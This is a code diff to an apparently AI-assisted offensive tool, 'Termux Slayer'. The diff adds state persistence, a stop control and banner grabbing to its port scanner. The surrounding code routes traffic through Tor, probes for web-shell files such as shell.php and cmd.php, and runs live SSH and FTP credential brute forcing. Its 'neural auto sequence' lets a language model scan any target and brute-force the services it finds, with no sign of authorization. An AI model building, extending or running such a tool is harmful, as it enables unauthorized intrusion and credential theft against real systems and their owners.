@@ -40,6 +40,7 @@ class SlayerConfig:
     VERSION = "1.0.0"
     BASE_DIR = os.path.dirname(os.path.abspath(__file__))
     LOG_FILE = os.path.join(BASE_DIR, "slayer_ops.log")
+    STATE_FILE = os.path.join(BASE_DIR, "slayer_state.json")
     DEFAULT_PORTS = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3306, 3389, 5432, 8080, 8443]
     TOR_PROXY = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
     PRIMARY_MODEL = "mistral-small-latest"
@@ -152,6 +153,28 @@ class SlayerConfig:
         "shell.php", "cmd.php", "eval.php", "exec.php", "system.php", "passthru.php", "shell.jsp", "cmd.jsp", "shell.aspx", "cmd.aspx", "shell.py", "cmd.py", "shell.pl", "cmd.pl", "shell.sh", "cmd.sh"
     ] + [f"path_{i}" for i in range(2000)] + [f"dir_{i}" for i in range(2000)]))
 
+class StateManager:
+    def __init__(self):
+        self.state = {"target": None, "history": [], "buffer": [], "keys": {}}
+        self.load()
+
+    def load(self):
+        if os.path.exists(SlayerConfig.STATE_FILE):
+            try:
+                with open(SlayerConfig.STATE_FILE, 'r') as f:
+                    self.state.update(json.load(f))
+            except: pass
+
+    def save(self):
+        try:
+            with open(SlayerConfig.STATE_FILE, 'w') as f:
+                json.dump(self.state, f)
+        except: pass
+
+    def update(self, key, value):
+        self.state[key] = value
+        self.save()
+
 class TorManager:
     def __init__(self, ui):
         self.ui = ui
@@ -193,6 +216,15 @@ class OffensiveSuite:
         self.cortex = cortex
         self.brute_active = False
         self.auto_active = False
+        self.executor = ThreadPoolExecutor(max_workers=100)
+        self.stop_event = threading.Event()
+
+    def stop_all(self):
+        self.stop_event.set()
+        self.brute_active = False
+        self.auto_active = False
+        time.sleep(0.5)
+        self.stop_event.clear()
 
     def scan(self, target):
         self.ui.active_tasks += 1
@@ -200,20 +232,24 @@ class OffensiveSuite:
             self.ui.add_log(f"Scanning Vectors: {target}", "INFO")
             open_ports = []
             def check(p):
+                if self.stop_event.is_set(): return
                 try:
                     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                         s.settimeout(0.5)
                         if s.connect_ex((target, p)) == 0:
-                            try: svc = socket.getservbyport(p)
-                            except: svc = "unknown"
-                            self.ui.add_log(f"Vector Open: {p} ({svc})", "SUCCESS")
-                            self.cortex.trigger_feedback(f"Open vector discovered on {target}: Port {p} ({svc})")
-                            open_ports.append((p, svc))
+                            try:
+                                s.send(b"HEAD / HTTP/1.0\r\n\r\n")
+                                banner = s.recv(1024).decode(errors='ignore').strip().split('\n')[0]
+                                if not banner: banner = socket.getservbyport(p)
+                            except: banner = "unknown"
+                            self.ui.add_log(f"Vector Open: {p} ({banner})", "SUCCESS")
+                            self.cortex.trigger_feedback(f"Open vector discovered on {target}: Port {p} ({banner})")
+                            open_ports.append((p, banner))
                             return p
                 except: pass
                 return None
-            with ThreadPoolExecutor(max_workers=50) as ex:
-                ex.map(check, SlayerConfig.DEFAULT_PORTS)
+            
+            list(self.executor.map(check, SlayerConfig.DEFAULT_PORTS))
             return open_ports
         finally:
             self.ui.active_tasks -= 1
@@ -225,9 +261,9 @@ class OffensiveSuite:
             self.ui.add_log(f"Initiating LIVE BRUTE on {target}:{service}", "INFO")
             found = False
             for user in SlayerConfig.USERS:
-                if not self.brute_active or found: break
+                if not self.brute_active or found or self.stop_event.is_set(): break
                 for pwd in SlayerConfig.PASSWORDS:
-                    if not self.brute_active or found: break
+                    if not self.brute_active or found or self.stop_event.is_set(): break
                     self.ui.add_log(f"Testing: {user}:{pwd}", "INFO")
                     if service.lower() == "ssh":
                         try:
@@ -316,7 +352,7 @@ class OffensiveSuite:
         try:
             self.ui.add_log(f"Initiating NEURAL AUTO SEQUENCE on {target}", "CRITICAL")
             recon_data = {"target": target, "type": "unknown", "details": {}}
-            if not self.auto_active: return
+            if not self.auto_active or self.stop_event.is_set(): return
             if re.match(r"^(http|https)://", target):
                 recon_data["type"] = "URL"
                 self.ui.add_log(f"Target identified as URL. Initiating Web Surface Analysis...", "INFO")
@@ -334,12 +370,12 @@ class OffensiveSuite:
                 self.ui.add_log(f"Target identified as IP. Initiating Vector Scan...", "INFO")
                 recon_data["details"]["open_ports"] = self.scan(target)
                 recon_data["details"]["geo"] = self.geo(target)
-            if not self.auto_active: return
+            if not self.auto_active or self.stop_event.is_set(): return
             self.ui.add_log("Phase 2: Consolidating Intelligence for Neural Core...", "AI")
             self.cortex.consult(target)
             open_ports = recon_data["details"].get("open_ports", [])
             for port, svc in open_ports:
-                if not self.auto_active: break
+                if not self.auto_active or self.stop_event.is_set(): break
                 if svc in ["ssh", "ftp", "telnet", "mysql", "postgresql"]:
                     self.ui.add_log(f"Executing Brute Force on {svc} ({port})", "INFO")
                     self.brute(target if recon_data["type"] != "URL" else host, svc)
@@ -674,9 +710,10 @@ class NeuralCortex:
 
 class TermuxSlayerApp:
     def __init__(self):
+        self.state = StateManager()
         self.layout = Layout()
         self.logs = []
-        self.target = None
+        self.target = self.state.state.get("target")
         self.current_cmd = ""
         self.active_tasks = 0
         self.spinner_chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
@@ -817,6 +854,7 @@ class TermuxSlayerApp:
             if not args: self.add_log("SCAN requires target (e.g., SCAN 192.168.1.1)", "WARN")
             else:
                 self.target = args[0]
+                self.state.update("target", self.target)
                 threading.Thread(target=self.offensive.scan, args=(self.target,), daemon=True).start()
         elif cmd == "BRUTE":
             if not args: self.add_log("BRUTE requires target (e.g., BRUTE 192.168.1.1 ssh)", "WARN")
